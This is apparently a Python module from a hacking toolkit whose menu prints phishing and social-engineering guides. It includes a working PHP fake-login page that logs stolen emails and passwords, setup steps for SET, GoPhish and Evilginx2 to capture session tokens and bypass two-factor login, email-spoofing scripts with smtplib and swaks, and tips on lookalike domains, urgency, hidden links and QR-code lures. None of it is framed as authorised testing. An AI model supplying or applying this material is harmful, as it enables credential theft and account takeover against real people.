# phishing and social engineering tools
import os, subprocess, base64
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box

console = Console()

def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def runcmd(cmd, t=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return p.stdout + p.stderr
    except:
        return "[!] failed"

def pause():
    Prompt.ask("\n[dim]enter to continue[/dim]")


def credential_harvester():
    clr()
    console.print("[bold red]=== CREDENTIAL HARVESTER ===[/bold red]\n")
    console.print("[dim]creates fake login pages that capture credentials[/dim]\n")
    
    console.print("[bold yellow]--- Method 1: SET (Social Engineering Toolkit) ---[/bold yellow]\n")
    console.print("  [cyan]setoolkit[/cyan]")
    console.print("  1) Social-Engineering Attacks")
    console.print("  2) Website Attack Vectors")
    console.print("  3) Credential Harvester Attack")
    console.print("  4) Web Templates / Site Cloner / Custom Import")
    console.print("  5) enter your IP or URL")
    console.print("  6) pick the site (google, facebook, etc)\n")
    
    console.print("[bold yellow]--- Method 2: Phishery (URL credential grabber) ---[/bold yellow]\n")
    console.print("  clone a login page:")
    console.print("  [cyan]git clone https://github.com/lnxg3y/phishery[/cyan]")
    console.print("  [cyan]python phishery.py -u login_page.html -w captured.txt[/cyan]\n")
    
    console.print("[bold yellow]--- Method 3: Manual (simple PHP) ---[/bold yellow]\n")
    php = '''<?php
if($_SERVER['REQUEST_METHOD']=='POST'){
    $creds = $_POST['email'].':'.$_POST['pass'];
    file_put_contents('log.txt', $creds.PHP_EOL, FILE_APPEND);
    header('Location: https://legit-site.com');
    exit;
}
?>
<form method="POST">
  <input name="email" type="email" placeholder="Email">
  <input name="pass" type="password" placeholder="Password">
  <button>Login</button>
</form>'''
    console.print(f"  [cyan]{php}[/cyan]\n")
    
    console.print("[bold yellow]--- Method 4: Evilginx2 ---[/bold yellow]\n")
    console.print("  advanced man-in-the-middle phishing:")
    console.print("  [cyan]git clone https://github.com/kgretzky/evilginx2[/cyan]")
    console.print("  [cyan]cd evilginx2 && make[/cyan]")
    console.print("  [cyan]./evilginx2[/cyan]")
    console.print("  then:")
    console.print("  config domain yourdomain.com")
    console.print("  config ipv4 YOUR_IP")
    console.print("  lures create")
    console.print("  lures get-url 0\n")
    
    pause()

def setoolkit_guide():
    clr()
    console.print("[bold red]=== SOCIAL ENGINEERING TOOLKIT (SET) ===[/bold red]\n")
    
    if os.path.exists("/usr/bin/setoolkit") or os.path.exists("/usr/bin/set"):
        console.print("[green]SET is installed[/green]\n")
        launch = Prompt.ask("[cyan]launch setoolkit? (y/n)[/cyan]", default="n")
        if launch.lower() == "y":
            os.system("setoolkit")
            pause()
            return
    else:
        console.print("[red]SET not found[/red]")
        console.print("[dim]install: sudo pacman -S set[/dim]")
        console.print("[dim]or: git clone https://github.com/trustedsec/social-engineer-toolkit[/dim]\n")
    
    console.print("""[bold yellow]--- SET Menu Guide ---[/bold yellow]

  1) Social-Engineering Attacks
     1) Spear-Phishing Attack Vectors
     2) Website Attack Vectors
        1) Java Applet Attack
        2) Credential Harvester Attack
        3) Tab-Nabbing Attack
        4) Web Jacking Attack
        5) Multi-Attack Method
     3) Infectious Media Generator
     4) Create a Payload and Listener
     5) Mass Mailer Attack
  
  2) Penetration Testing (Fast-Track)
  3) Third Party Modules
  4) Update SET
  5) Help
  
[y]popular attacks:[/y]
  - Credential Harvester (most common)
  - Java Applet (needs old Java)
  - Create Payload + Listener (creates exe + msf handler)
""")
    pause()

def gophish_info():
    clr()
    console.print("[bold red]=== GOPHISH REFERENCE ===[/bold red]\n")
    console.print("[dim]GoPhish is a phishing framework with a web UI[/dim]\n")
    
    console.print("""[bold yellow]--- Setup ---[/bold yellow]

  1. download: https://getgophish.com/
  2. unzip and run:
     [cyan]./gophish[/cyan]
  3. open browser to https://127.0.0.1:3333
  4. default creds: admin / gophish
  
[y]configuration:[/y]
  - Sending Profile: set up SMTP (gmail, etc)
  - Email Templates: clone or create phishing emails
  - Landing Pages: fake login pages
  - Users/Groups: target list
  - Campaigns: combine everything and launch

[y]tips:[/y]
  - use URL shorteners to hide links
  - spoof the sender address
  - create urgency in the email
  - track opens, clicks, submissions
""")
    pause()

def evilginx_guide():
    clr()
    console.print("[bold red]=== EVILGINX2 GUIDE ===[/bold red]\n")
    console.print("[dim]evilginx2 is an AITM phishing tool that captures session tokens[/dim]\n")
    
    console.print("""[bold yellow]--- Setup ---[/bold yellow]

  1. [cyan]git clone https://github.com/kgretzky/evilginx2[/cyan]
  2. [cyan]cd evilginx2 && make[/cyan]
  3. [cyan]sudo ./evilginx2[/cyan]
  
[y]config:[/y]
  config domain yourdomain.com
  config ipv4 YOUR_IP
  
[y]building lures:[/y]
  lures create
  lures get-url 0        # get the phishing URL
  
[y]phishlets:[/y]
  phishlets hostname o365 login.yourdomain.com
  phishlets enable o365
  
[y]campaigns:[/y]
  lures create
  lures edit 0
  lures get-url 0
  
[y]what it captures:[/y]
  - session tokens (bypasses 2FA!)
  - cookies
  - credentials
  - the user gets redirected to the real site after
  
[y]deploy:[/y]
  - use cloudflare or nginx to proxy
  - need valid SSL cert (letsencrypt)
  - point DNS to your server
""")
    pause()

def email_spoof_info():
    clr()
    console.print("[bold red]=== EMAIL SPOOFING INFO ===[/bold red]\n")
    
    console.print("""[bold yellow]--- Methods ---[/yellow]

  1) SET (Social Engineering Toolkit)
     automates the whole process

  2) sendmail / smtp directly
     [cyan]python3 -c "
  import smtplib
  from email.mime.text import MIMEText
  msg = MIMEText('body')
  msg['Subject'] = 'subject'
  msg['From'] = 'spoofed@domain.com'
  msg['To'] = 'target@victim.com'
  s = smtplib.SMTP('smtp.gmail.com', 587)
  s.starttls()
  s.login('your_email', 'app_password')
  s.send_message(msg)
  " [/cyan]

  3) swaks (Swiss Army Knife for SMTP)
     [cyan]swaks --to target@victim.com --from spoofed@domain.com --server smtp.gmail.com --port 587 --auth LOGIN --auth-user your_email --auth-password app_password --header "Subject: Urgent" --body "body text"[/cyan]

[y]SPF/DKIM/DMARC bypass:[/y]
  - if target domain has weak DMARC policy (p=none or not set), spoofing works
  - check: dig TXT domain.com | grep spf
  - if no SPF record, you can spoof freely
  - if ~all (softfail), some servers accept
  - if -all (hardfail), harder to spoof

[y]tips:[/y]
  - use lookalike domains (paypa1.com, rnicrosoft.com)
  - register similar domains for targeted attacks
  - use email aliases for anonymity
""")
    pause()

def qr_phishing():
    clr()
    console.print("[bold red]=== QR CODE PHISHING ===[/bold red]\n")
    
    console.print("""[bold yellow]--- Generate QR codes for phishing ---[/yellow]

  online tools:
  - qr-code-generator.com
  - qrcode-monkey.com
  
  CLI:
  [cyan]qrencode -o phish.png 'https://your-phishing-url.com'[/cyan]
  
  python:
  [cyan]pip install qrcode[pil]
  python3 -c "import qrcode; qrcode.make('https://evil.com').save('qr.png')"[/cyan]

[y]usage:[/y]
  - print QR codes and place them around (posters, etc)
  - send via email/messaging apps
  - embed in documents
  - physical social engineering (plug USB drives with QR stickers)
""")
    pause()


def run():
    while True:
        clr()
        console.print("[bold red]=== PHISHING & SOCIAL ENGINEERING ===[/bold red]\n")
        from rich.table import Table
        t = Table(show_header=False, box=box.ROUNDED, border_style="red", padding=(0, 2))
        t.add_column("", style="bold yellow", width=4)
        t.add_column("")
        opts = [
            "Credential Harvester",
            "Social Engineering Toolkit (SET)",
            "GoPhish Reference",
            "Evilginx2 Guide",
            "Email Spoofing Info",
            "QR Code Phishing",
        ]
        for i, o in enumerate(opts, 1):
            t.add_row(str(i), o)
        t.add_row("", "")
        t.add_row("b", "Back")
        console.print(Panel(t, title="[bold]PHISHING[/bold]", border_style="red"))
        
        try:
            c = int(Prompt.ask("[bold yellow]>[/bold yellow]"))
        except ValueError:
            c = 0
        
        if c == 1: credential_harvester()
        elif c == 2: setoolkit_guide()
        elif c == 3: gophish_info()
        elif c == 4: evilginx_guide()
        elif c == 5: email_spoof_info()
        elif c == 6: qr_phishing()
        elif c == 0: return
